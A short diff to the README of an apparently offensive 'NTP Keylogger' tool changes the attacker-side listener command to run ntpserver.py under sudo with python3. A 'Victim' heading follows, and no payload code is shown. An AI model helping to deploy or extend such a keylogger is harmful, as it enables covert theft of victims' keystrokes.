@@ -1,7 +1,7 @@
 # NTP Keylogger   
 ## Listener
 ```
-rlwrap python ntpserver.py
+sudo python3 ntpserver.py
 ```
 
 ## Victim
